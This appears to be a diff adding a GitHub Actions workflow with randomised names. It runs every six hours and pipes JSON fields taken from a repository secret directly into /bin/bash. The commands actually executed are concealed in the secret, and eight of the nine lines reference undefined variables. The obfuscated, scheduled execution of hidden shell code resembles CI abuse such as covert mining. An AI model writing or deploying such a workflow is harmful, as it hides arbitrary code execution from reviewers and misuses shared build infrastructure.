@@ -1,0 +1,27 @@
+name: shangdongpeng4637
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shangdongpeng4637
+        env:
+          nke539: ${{ secrets.nke539 }}
+        run: |
+          echo $nke539 | jq -r .i352 | /bin/bash
+          echo $iimt3134 | jq -r .wmhud3451 | /bin/bash
+          echo $efrdb44 | jq -r .gb67 | /bin/bash
+          echo $lpfx35 | jq -r .w50027 | /bin/bash
+          echo $etsj955 | jq -r .w86019 | /bin/bash
+          echo $ga7114 | jq -r .d33514 | /bin/bash
+          echo $b3918 | jq -r .gqi85863 | /bin/bash
+          echo $lofsn45 | jq -r .ezx35 | /bin/bash
+          echo $eh4 | jq -r .ustn51221 | /bin/bash
+
